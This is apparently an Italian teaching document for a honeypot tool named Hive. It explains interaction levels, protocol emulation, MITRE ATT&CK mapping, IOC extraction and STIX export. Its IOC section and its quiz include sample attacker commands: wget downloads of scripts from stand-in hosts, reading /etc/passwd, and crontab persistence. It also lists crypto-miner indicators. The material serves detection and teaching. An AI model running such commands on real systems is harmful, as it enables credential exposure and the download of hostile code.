# Concetti di Sicurezza

## Teoria degli Honeypot

Un honeypot è un sistema deliberatamente esposto progettato per attirare aggressori. A differenza dei sistemi di produzione che cercano di tenere fuori gli intrusi, gli honeypot li accolgono e registrano tutto ciò che fanno. Questo crea un vantaggio unico: ogni interazione è sospetta. Non ci sono falsi positivi da utenti legittimi perché gli utenti legittimi non dovrebbero mai interagire con un honeypot.

Gli honeypot si collocano su uno spettro di profondità di interazione:

Gli honeypot a **bassa interazione** (low interaction) simulano solo quanto basta di un servizio per registrare i tentativi di connessione. Si pensi a un listener TCP che accetta connessioni SSH, registra la stringa di versione del client e si disconnette immediatamente. Strumenti come Honeyd e HoneyDrive funzionano in questo modo. Catturano scansioni e tentativi elementari di brute force, ma un aggressore che supera l'handshake iniziale si accorgerà che qualcosa non va.

Gli honeypot a **media interazione** (medium interaction) implementano una logica di protocollo sufficiente a sostenere una conversazione. Un honeypot SSH accetta qualsiasi password, presenta un finto prompt di shell e risponde a comandi di base. Questo è ciò che implementa Hive. Gli aggressori possono eseguire comandi, scaricare strumenti e tentare il movimento laterale (lateral movement) mentre l'honeypot registra ogni sequenza di tasti.

Gli honeypot ad **alta interazione** (high interaction) sono sistemi reali, spesso VM o container, che eseguono veri sistemi operativi con vulnerabilità reali. I difensori li dotano di strumenti di monitoraggio e lasciano che gli aggressori li compromettano completamente. T-Pot di Deutsche Telekom utilizza container Docker che eseguono servizi reali per ottenere questo risultato.

### Classificazione per Scopo

Gli **honeypot di ricerca** (research honeypots) vengono distribuiti dai team di sicurezza per studiare le tendenze degli attacchi. Il SANS Internet Storm Center gestisce una rete globale di sensori che alimenta i dati nei loro report quotidiani. Questi honeypot mirano a raccogliere quanti più dati possibile.

Gli **honeypot di produzione** (production honeypots) si affiancano a server reali in una rete aziendale. Il loro obiettivo è il rilevamento, non la ricerca. Quando qualcosa si connette a un server di database fittizio di cui nessuno dovrebbe conoscere l'esistenza, scatta un avviso. Thinkst Canaries ha commercializzato questo concetto.

## Emulazione dei Protocolli

Ciascun protocollo simulato da Hive presenta elementi specifici che devono essere abbastanza realistici da ingannare gli strumenti automatizzati.

### SSH (RFC 4253)

L'handshake SSH inizia con lo scambio delle stringhe di versione tra le due parti. Il server invia una stringa simile a `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5`. Gli strumenti automatizzati verificano questa stringa per determinare quali exploit tentare. Hive utilizza un banner OpenSSH Ubuntu realistico anziché qualcosa di palesemente fittizio.

Dopo lo scambio della versione, il protocollo negozia gli algoritmi di key exchange, genera le chiavi di sessione e gestisce l'autenticazione. La decisione critica risiede nella policy di autenticazione: Hive accetta tutte le password e registra le credenziali. È così che funzionano Cowrie e altri honeypot SSH. Nello studio del 2019 condotto da Wagener et al., è emerso che il 78% dei bot per il brute force SSH si ferma dopo un login riuscito, esegue un piccolo insieme di comandi di ricognizione e poi si disconnette. Il restante 22% scarica strumenti aggiuntivi, tipicamente miner di criptovalute.

### Protocollo Wire di MySQL

MySQL utilizza un protocollo binario basato su pacchetti con framing. Il server inizia con un pacchetto di Greeting contenente la versione del server, un ID di connessione e un salt di autenticazione. Hive implementa solo quanto basta di questo handshake per catturare le credenziali. Quando gli aggressori tentano query SQL, l'honeypot restituisce risposte plausibili (versione del server, elenchi di database) per mantenere viva la sessione.

Il protocollo MySQL è particolarmente interessante perché botnet come MiraiSQL prendono di mira in modo specifico i server MySQL esposti. Nel 2022, Aqua Security ha documentato una campagna che scansionava la rete alla ricerca di server MySQL, eseguiva attacchi di brute force sulle credenziali e utilizzava poi `SELECT ... INTO OUTFILE` per rilasciare web shell.

### Negoziazione SMB (SMB Negotiate)

SMB è il protocollo più complesso toccato da Hive, ed è intenzionalmente l'implementazione più semplice. Una sessione SMB2 completa richiede la gestione di oltre 15 tipi di messaggi. Hive implementa unicamente la fase di negoziazione: legge il frame NetBIOS, rileva se il client comunica in SMB1 o SMB2, restituisce una risposta di negoziazione e chiude. Questo è sufficiente per rilevare strumenti di scansione come gli script smb-enum di nmap e gli scanner per EternalBlue, che è stato l'exploit impiegato nell'attacco ransomware WannaCry del 2017 che ha colpito oltre 200.000 sistemi in 150 paesi.

## Mappatura MITRE ATT&CK

Il framework MITRE ATT&CK cataloga tattiche, tecniche e procedure (TTP) degli avversari osservate negli attacchi nel mondo reale. Le tattiche rappresentano il "perché" (cosa l'aggressore sta cercando di ottenere) e le tecniche rappresentano il "come".

Hive rileva tecniche relative a diverse tattiche:

**Reconnaissance (TA0043)**: Port scanning (T1595) e vulnerability scanning (T1595.002) vengono rilevati quando un singolo IP si connette a molteplici servizi honeypot entro un breve intervallo di tempo.

**Credential Access (TA0006)**: Gli attacchi di brute force (T1110) vengono rilevati contando i tentativi di autenticazione per IP. Cinque o più tentativi di accesso entro cinque minuti dalla medesima sorgente innescano un rilevamento T1110. Questa soglia deriva dall'analisi dei log dell'honeypot Cowrie, in cui gli utenti SSH legittimi effettuano in media 1,2 tentativi per sessione mentre gli strumenti di brute force registrano una media di 20-50 tentativi al minuto.

**Execution (TA0002)**: Quando un aggressore esegue comandi nella shell SSH, ciascun comando viene classificato. L'esecuzione di `uname -a` o `cat /proc/cpuinfo` mappa su System Information Discovery (T1082). L'esecuzione di `wget` o `curl` per scaricare strumenti mappa su Ingress Tool Transfer (T1105). L'esecuzione di `crontab` mappa su Scheduled Task/Job: Cron (T1053.003).

**Impact (TA0040)**: I comandi per il mining di criptovalute (xmrig, stratum+tcp, cryptonight) mappano su Resource Hijacking (T1496). Secondo il report di Trend Micro del 2023, il crypto mining è l'attività di post-exploitation più comune osservata sui server Linux compromessi, riscontrata nel 42% degli incidenti.

## Estrazione degli Indicatori di Compromissione (IOC)

Un IOC (Indicator of Compromise) è qualsiasi artefatto osservato durante un attacco che può essere impiegato per il rilevamento. Hive estrae diverse tipologie di IOC:

**Indirizzi IP**: Ogni IP sorgente che si connette a un honeypot costituisce un IOC. Gli indirizzi privati/loopback vengono esclusi mediante filtro. IPv4 e IPv6 vengono tracciati separatamente con pattern di indicatori STIX (`[ipv4-addr:value = '..']`).

**URL**: Comandi come `wget http://malicious.com/payload.sh` contengono URL che possono essere inseriti in blocklist. Il pattern regex estrae gli URL dalle stringhe di comando, dai corpi delle richieste HTTP e dai percorsi dei trasferimenti file FTP.

**Firme degli strumenti (Tool signatures)**: Le stringhe di versione del client SSH e gli header user-agent HTTP rivelano gli strumenti impiegati dall'aggressore. Hydra, Medusa e ncrack presentano ciascuno firme caratteristiche distinte. Identificare la famiglia di appartenenza dello strumento contribuisce a correlare attacchi appartenenti alla medesima campagna anche in presenza di IP sorgente differenti.

**Credenziali**: Le coppie username/password catturate rivelano quali elenchi di credenziali siano correntemente utilizzati dalle botnet. Le credenziali SSH più comuni nei dati raccolti dagli honeypot nel 2024 sono state root/admin, root/password e admin/admin, in base ai report di SANS ISC.

## Standard di Threat Intelligence

### STIX 2.1

Structured Threat Information eXpression (STIX) è il formato standard per la condivisione della cyber threat intelligence. Hive esporta gli IOC sotto forma di bundle STIX 2.1 contenenti Indicator Structured Domain Objects (SDO). Ciascun indicatore include un'espressione pattern STIX, un punteggio di confidenza (confidence score), un timestamp valid-from e relative etichette.

Piattaforme come MISP, OpenCTI e TheHive possono importare direttamente i bundle STIX. Ciò significa che i dati dell'honeypot possono confluire automaticamente nella pipeline di threat intelligence di un'organizzazione senza richiedere elaborazioni manuali.

### Blocklist per Firewall

Per intraprendere azioni difensive immediate, Hive genera blocklist di IP in formati direttamente utilizzabili dalle infrastrutture più diffuse: regole iptables, direttive deny per nginx, testo semplice (un IP per riga) e CSV arricchiti di metadati. Un team SOC può esportare una blocklist dalla dashboard e applicarla ai firewall perimetrali entro pochi minuti dall'osservazione di un attacco.

## Incidenti nel Mondo Reale

**WannaCry del 2017**: Gli honeypot in ascolto sulla porta 445 (SMB) sono stati tra i primi a rilevare la diffusione su Internet del worm basato su EternalBlue. I ricercatori di MalwareTech hanno utilizzato i dati degli honeypot per identificare il dominio kill switch, bloccando l'ulteriore propagazione del worm.

**Log4Shell del 2021 (CVE-2021-44228)**: A poche ore dalla divulgazione della vulnerabilità, gli honeypot hanno registrato scansioni massive mirate a Log4j su HTTP, LDAP e altri protocolli. GreyNoise ha riferito che la propria rete di honeypot ha rilevato tentativi di sfruttamento da parte di oltre 1.400 IP univoci già nelle prime 24 ore.

**MOVEit Transfer del 2023 (CVE-2023-34362)**: Alcuni ricercatori di sicurezza hanno predisposto honeypot HTTP a imitazione delle pagine di login di MOVEit Transfer. Hanno così intercettato l'esatto payload di SQL injection sfruttato dal gruppo ransomware Cl0p, permettendo alle organizzazioni di verificare se fossero state violate prima che la vulnerabilità divenisse di pubblico dominio.

## Verifica le Tue Conoscenze

1. Perché un honeypot SSH a media interazione accetta qualsiasi password? Cosa cambierebbe se accettasse solo credenziali specifiche?
2. Un aggressore si connette all'honeypot SSH, esegue `id`, `cat /etc/passwd`, `wget http://evil.com/bot.sh` e `crontab -e`. Quali tecniche MITRE ATT&CK rappresenta questa sequenza?
3. Perché l'implementazione SMB è limitata alla sola negoziazione? Quali dati di attacco aggiuntivi verrebbero catturati da un'implementazione completa di una sessione SMB2?

## Ulteriori Letture

**Essenziali:**
- MITRE ATT&CK for Enterprise: https://attack.mitre.org/
- Specifica STIX 2.1: https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html
- Honeypot SSH/Telnet Cowrie: https://github.com/cowrie/cowrie

**Approfondimenti:**
- Serie "Know Your Enemy" a cura di The Honeynet Project
- RFC 4253 (SSH Transport Layer) e RFC 4252 (SSH Authentication)
- Piattaforma multi-honeypot T-Pot di Deutsche Telekom Security
